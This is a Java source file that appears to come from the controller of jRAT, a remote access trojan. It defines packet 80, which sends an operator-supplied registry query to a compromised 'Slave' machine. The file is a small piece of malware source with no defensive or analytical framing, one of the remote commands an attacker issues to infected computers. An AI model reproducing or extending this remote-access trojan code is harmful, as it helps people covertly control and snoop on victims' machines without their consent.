package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet80CustomRegQuery extends AbstractOutgoingPacket {

	private String query;

	public Packet80CustomRegQuery(String query) {
		this.query = query;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(query);
	}

	@Override
	public short getPacketId() {
		return 80;
	}

}
